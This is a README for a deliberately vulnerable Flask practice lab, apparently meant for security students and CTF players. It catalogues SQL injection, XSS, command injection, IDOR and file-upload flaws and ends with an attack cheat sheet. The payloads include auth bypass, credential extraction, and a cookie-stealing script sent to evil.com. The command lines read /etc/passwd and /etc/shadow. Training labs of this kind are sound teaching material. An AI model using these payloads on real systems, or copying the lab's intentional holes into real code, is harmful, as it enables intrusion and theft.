# 🏠 Vulnerable Web Lab — MyHomeLabExample.net

> **A realistic, multi-vulnerability training lab for SQL Injection, XSS, Command Injection, IDOR, File Upload, and more.**

> ⚠️ **WARNING**: This application is **intentionally vulnerable**. Never deploy it on a production server or public network. Use only in isolated lab environments.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Quick Start](#quick-start)
- [Difficulty Levels](#difficulty-levels)
- [Vulnerability Reference](#vulnerability-reference)
  - [SQL Injection (SQLi)](#1-sql-injection-sqli)
  - [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
  - [OS Command Injection](#3-os-command-injection)
  - [Insecure Direct Object Reference (IDOR)](#4-insecure-direct-object-reference-idor)
  - [File Upload Vulnerabilities](#5-file-upload-vulnerabilities)
  - [Request Logging](#6-request-logging)
- [MySQL Simulation Layer](#mysql-simulation-layer)
- [Attack Cheat Sheet](#attack-cheat-sheet)
- [Project Structure](#project-structure)
- [Tech Stack](#tech-stack)

---

## Overview

This is a deliberately vulnerable web application built with Flask and SQLite, designed for **cybersecurity students, CTF players, and penetration testers** to practice real-world attack techniques in a safe, legal environment.

The application simulates an e-commerce website with products, users, categories, comments, file uploads, and admin functionality — each laced with exploitable vulnerabilities.

---

## Features

| Feature | Description |
|---------|-------------|
| 🛒 E-commerce UI | Full product catalog, categories, search, user profiles |
| 🔐 Auth System | Registration, login, admin panel |
| 📸 User Gallery | Photo sharing page with SQLi + XSS combo |
| 📡 Request Logger | Real-time request monitoring with IP tracking |
| 🎯 Difficulty System | Easy / Medium / Hard tiers with escalating WAF filters |
| 🐬 MySQL Simulation | SQLite backend that behaves like MySQL for SQLi training |

---

## Quick Start

### Prerequisites

- Python 3.8+
- pip

### Install & Run

```bash
# Clone the repository
git clone <repo-url>
cd newlab

# Install dependencies
pip install -r requirements.txt

# Run the application (easy mode)
python app.py

# Run with reset (fresh database)
python app.py --reset

# Run with --debug for auto-reload
python app.py --reset --debug
```

### Windows Users

If the server hangs or you see stale behavior, use the included batch file:

```
double-click restart.bat
```

Or manually:

```bash
taskkill /F /IM python.exe
python app.py --reset --debug
```

### Access the Lab

Open your browser to: **http://127.0.0.1:5000**

### Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Administrator |
| alice | password1 | Regular user |
| bob | letmein | Regular user |
| charlie | charlie123 | Regular user |
| diana | diana2024 | Regular user |
| eve | evepassword | Regular user |
| frank | frank99 | Regular user |
| grace | grace2025 | Regular user |
| henry | henry007 | Regular user |
| iris | iris888 | Regular user |

---

## Difficulty Levels

The lab supports three difficulty tiers that progressively add WAF-like filtering:

```bash
python app.py --easy     # Default — no filtering
python app.py --medium   # Case-sensitive keyword blacklist
python app.py --hard     # Regex-based filter (bypassable)
```

### Easy Mode
- **SQLi**: No input filtering — raw injection works directly
- **XSS**: No sanitization — any HTML/JS passes through
- **Upload**: No file type restrictions
- **IDOR**: No authentication required

### Medium Mode
- **SQLi**: Case-sensitive keyword blacklist (`union`, `select`, `or `, `--`, `#`)
  - **Bypass**: Use `UNION` (uppercase), `/**/OR/**/`, or `#` without space
- **XSS**: Strips `<script>` tags only
  - **Bypass**: Use `<img onerror=...>`, `<svg onload=...>`, or `<scr<script>ipt>`
- **Upload**: Case-sensitive blocklist (blocks `.php` but not `.PHP`)
- **IDOR**: Login required but no ownership check

### Hard Mode
- **SQLi**: Regex-based filter, case and whitespace sensitive
  - **Bypass**: MySQL versioned comments `/*!50000UNION*/`, inline comments `UN/**/ION`
- **XSS**: Strips `<script>` + lowercase event handlers (`onerror`, `onload`)
  - **Bypass**: `<OnErRor=...>` (mixed case), `<details ontoggle=...>`, `<svg/onload=...>`
- **Upload**: Only checks LAST extension (`.php.jpg` passes!)
- **IDOR**: UUID-based IDs, login required, no ownership check

---

## Vulnerability Reference

### 1. SQL Injection (SQLi)

All user input is concatenated directly into SQL queries using Python f-strings (never parameterized).

#### Affected Routes

| Route | Parameter | Technique |
|-------|-----------|-----------|
| `/product.html?id=` | `id` | UNION, Error-based, GROUP BY, EXTRACTVALUE |
| `/search.html?q=` | `q` | UNION, Error-based |
| `/user.html?name=` | `name` | UNION, Error-based |
| `/category.html?cat_id=` | `cat_id` | UNION |
| `/login` | `username`, `password` | Auth bypass |
| `/user-galary-2026-event-photo.html?photo=` | `photo` | UNION, ORDER BY, Error-based |
| `/profile?id=` | `id` | IDOR + SQLi |

#### SQLi Attack Examples

**Basic injection detection:**
```
/product.html?id=1'          → Error reveals SQL syntax
/product.html?id=1' -- -     → No error (comment works)
```

**UNION-based extraction:**
```
/product.html?id=1' UNION SELECT 1,2,3,4,5 -- -
```

**ORDER BY column enumeration:**
```
/product.html?id=1' ORDER BY 1 -- -   → No error
/product.html?id=1' ORDER BY 7 -- -   → No error (7 columns)
/product.html?id=1' ORDER BY 8 -- -   → Error (too many)
```

**Extract data via UNION:**
```
/product.html?id=-1' UNION SELECT 1,username,password,4,5 FROM users -- -
```

**Auth bypass:**
```
Login username: admin' -- -
Login password: anything
```

---

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS

| Route | Parameter |
|-------|-----------|
| `/search.html?q=` | `q` (rendered with `\| safe`) |
| `/user.html?name=` | `name` |
| `/user-galary-2026-event-photo.html?photo=` | `photo` (rendered with `\| safe`) |

**Attack examples:**
```
/search.html?q=<script>alert('XSS')</script>
/search.html?q=<img src=x onerror=alert(1)>
/user-galary-2026-event-photo.html?photo=<svg onload=alert(document.cookie)>
```

#### Stored XSS

| Route | Field |
|-------|-------|
| `/profile` (bio update) | `bio` |
| `/comment` (product review) | `content` |

**Attack flow:**
1. Login as any user
2. Go to your profile → set bio to `<script>document.location='http://evil.com/?c='+document.cookie</script>`
3. Anyone viewing your profile triggers the XSS
4. Post a comment on any product with XSS payload — all visitors see it

---

### 3. OS Command Injection

**Route:** `/search.html?q=`

The search feature runs `ping -c 1 <query>` (Linux) or `ping -n 1 <query>` (Windows) using `subprocess.run(shell=True)`. The query parameter is passed directly to the shell.

**Attack examples:**
```
/search.html?q=127.0.0.1                    → Shows ping output
/search.html?q=127.0.0.1; whoami            → Runs whoami
/search.html?q=; cat /etc/passwd            → Reads /etc/passwd (Linux)
/search.html?q=; dir C:\Users              → Lists directory (Windows)
/search.html?q=; python -c "print('pwned')" → Arbitrary code execution
```

**Severity:** CRITICAL — Full Remote Code Execution (RCE)

---

### 4. Insecure Direct Object Reference (IDOR)

**Route:** `/profile?id=`

| Difficulty | Auth Required | ID Type | Ownership Check |
|------------|--------------|---------|-----------------|
| Easy | ❌ No | Sequential integer | ❌ None |
| Medium | ✅ Yes | Sequential integer | ❌ None |
| Hard | ✅ Yes | UUID | ❌ None |

**Attack flow (Easy mode):**
```
/profile?id=1   → admin's profile (see email, phone, address)
/profile?id=2   → alice's profile
/profile?id=3   → bob's profile
```

**UUID discovery (Hard mode):**
```
# Use the leaky autocomplete API to discover UUIDs
/api/users/search?q=alice
# Response reveals: {"uuid": "uuid-alice-0002", ...}

# Then access profile by UUID
/profile?id=uuid-alice-0002
```

---

### 5. File Upload Vulnerabilities

**Route:** `/upload`

| Difficulty | Protection | Bypass |
|------------|-----------|--------|
| Easy | None | Upload anything |
| Medium | Case-sensitive blocklist | `.PHP`, `.PhP` |
| Hard | Last extension only | `shell.php.jpg`, `backdoor.php.png` |

**Attack flow (Hard mode):**
1. Login as any user
2. Upload a file named `shell.php.jpg`
3. The server only checks `.jpg` (passes allowlist)
4. File is saved as `shell.php.jpg` and accessible at `/uploads/shell.php.jpg`
5. Depending on server config, the PHP may execute

---

### 6. Request Logging

**Route:** `/admin/requests`

All HTTP requests are logged with:
- **Source IP address**
- **Timestamp**
- **HTTP Method** (GET/POST)
- **Request path + query string**
- **User-Agent header**

This page is accessible **without authentication** (intentional for training) and demonstrates how server logs can expose attacker activity.

Features:
- Filter by IP address
- IP summary with request counts
- Color-coded badges (green for localhost, yellow for external)

---

## MySQL Simulation Layer

The lab runs on SQLite but **simulates MySQL-specific behavior** for advanced SQLi training via `mysql_sim.py`.

### Column Count Confusion

Different product IDs use different SELECT projections, so UNION-based column enumeration becomes confusing:

| Product IDs | Columns | SELECT |
|-------------|---------|--------|
| 1–5 | **7** | `id, name, description, price, category_id, NULL, NULL` |
| 6 | **4** | `id, name, price, category_id` |
| 7–8 | **7** | `id, name, description, price, category_id, NULL, NULL` |
| 9–10 | **5** | `id, name, description, price, category_id` |

**Effect on attacker:**
```
UNION SELECT 1,2,3,4,5,6,7  → Works on id=1-5,7-8 | FAILS on id=6,9-10
UNION SELECT 1,2,3,4,5       → Works on id=9-10    | FAILS on id=1-8
```

This makes attackers believe different endpoints use different query structures.

### GROUP BY RAND() Error-Based SQLi

**Payload:**
```
/product.html?id=10' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- -
```

**Simulated MySQL Error:**
```
Duplicate entry '8.0.35-0ubuntu0.22.04.1:1' for key 'group_key'
```

The version string is leaked through the error message, mimicking real MySQL behavior.

### EXTRACTVALUE/XPath Error-Based Extraction

**Payload:**
```
/product.html?id=1' or extractvalue(0x0a,concat(0x0a,(select version()))) -- -
```

**Simulated MySQL Error:**
```
XPATH syntax error: '\n8.0.35-0ubuntu0.22.04.1'
```

**Extract table names:**
```
/product.html?id=1' or extractvalue(0x0a,concat(0x0a,(select group_concat(name) FROM sqlite_master WHERE type='table'))) -- -
```

**Result:**
```
XPATH syntax error: '\nusers,products,categories,comments,uploads'
```

Works for arbitrary inner SELECT queries — the lab converts MySQL syntax to SQLite equivalents automatically.

---

## Attack Cheat Sheet

### Full Data Exfiltration Chain

```bash
# Step 1: Find injection point
/product.html?id=1'

# Step 2: Enumerate columns with ORDER BY
/product.html?id=1' ORDER BY 7 -- -    # Works
/product.html?id=1' ORDER BY 8 -- -    # Fails

# Step 3: Find visible columns with UNION
/product.html?id=-1' UNION SELECT 1,2,3,4,5,6,7 -- -

# Step 4: Extract database info
/product.html?id=-1' UNION SELECT 1,sqlite_version(),3,4,5,6,7 -- -

# Step 5: List tables
/product.html?id=-1' UNION SELECT 1,group_concat(name),3,4,5,6,7 FROM sqlite_master WHERE type='table' -- -

# Step 6: Extract users table
/product.html?id=-1' UNION SELECT 1,group_concat(username||':'||password),3,4,5,6,7 FROM users -- -

# Step 7: Use MySQL-style extraction (no column count needed!)
/product.html?id=1' or extractvalue(0x0a,concat(0x0a,(select group_concat(username,0x3a,password) FROM users))) -- -
```

### Auth Bypass

```bash
# Login as admin without password
Username: admin' -- -
Password: anything

# Union-based auth bypass
Username: ' UNION SELECT 1,'admin','admin123',1,1,1,1,1,1 -- -
Password: anything
```

### XSS Payloads

```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag (bypasses <script> filter) -->
<img src=x onerror=alert(1)>

<!-- SVG (bypasses <script> filter) -->
<svg onload=alert(1)>

<!-- Mixed case (bypasses hard mode) -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Event handler (bypasses hard mode) -->
<details ontoggle=alert(1) open>
<marquee onstart=alert(1)>
```

### Command Injection

```bash
# Windows
; whoami
; ipconfig
; type C:\Windows\System32\drivers\etc\hosts
; net user

# Linux
; whoami
; id
; cat /etc/passwd
; cat /etc/shadow
; ls -la /root
```

---

## Project Structure

```
newlab/
├── app.py                  # Main Flask application (routes, logic)
├── difficulty.py           # WAF filters for each difficulty tier
├── mysql_sim.py            # MySQL behavior simulation (GROUP BY, EXTRACTVALUE)
├── seed.py                 # Database seeding (users, products, categories)
├── vulnlab.db              # SQLite database (auto-created)
├── requirements.txt        # Python dependencies
├── restart.bat             # Windows clean restart script
├── templates/
│   ├── base.html           # Base template (navbar, footer, scripts)
│   ├── home.html           # Homepage with product cards
│   ├── product.html        # Product detail page (SQLi target)
│   ├── category.html       # Category listing (SQLi target)
│   ├── search.html         # Search results (SQLi + CMD injection)
│   ├── user.html           # User profile view (SQLi target)
│   ├── members.html        # All users listing
│   ├── login.html          # Login form
│   ├── register.html       # Registration form
│   ├── profile.html        # User profile (IDOR + Stored XSS)
│   ├── admin.html          # Admin dashboard
│   ├── admin_requests.html # Request log viewer
│   ├── upload.html         # File upload page
│   └── user_galary_event_photo.html  # Gallery (SQLi + XSS combo)
├── static/
│   └── style.css           # Custom styles
└── uploads/                # Uploaded files directory
```

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Backend | Python 3.8+ / Flask 3.x |
| Database | SQLite3 |
| Frontend | Bootstrap 5.3, HTML5, JavaScript |
| CSS Framework | Bootstrap CDN |
| Auth | Flask sessions (client-side cookies) |

---

## Learning Objectives

After completing challenges in this lab, you will understand:

1. **SQL Injection** — UNION-based, error-based, blind, ORDER BY enumeration
2. **XSS** — Reflected, stored, DOM-based, filter bypasses
3. **Command Injection** — Shell metacharacters, chained commands
4. **IDOR** — Sequential ID enumeration, UUID discovery via leaky APIs
5. **File Upload** — Extension double-encoding, double extensions, path traversal
6. **WAF Bypass** — Case variation, inline comments, encoding tricks
7. **MySQL vs SQLite differences** — Simulated MySQL errors on SQLite backend
8. **Error-based data extraction** — EXTRACTVALUE, UPDATEXML, GROUP BY techniques
9. **Server-side information gathering** — Request logs, API leaks, error messages

---

## License

This project is for **educational purposes only**. Use responsibly in authorized lab environments.
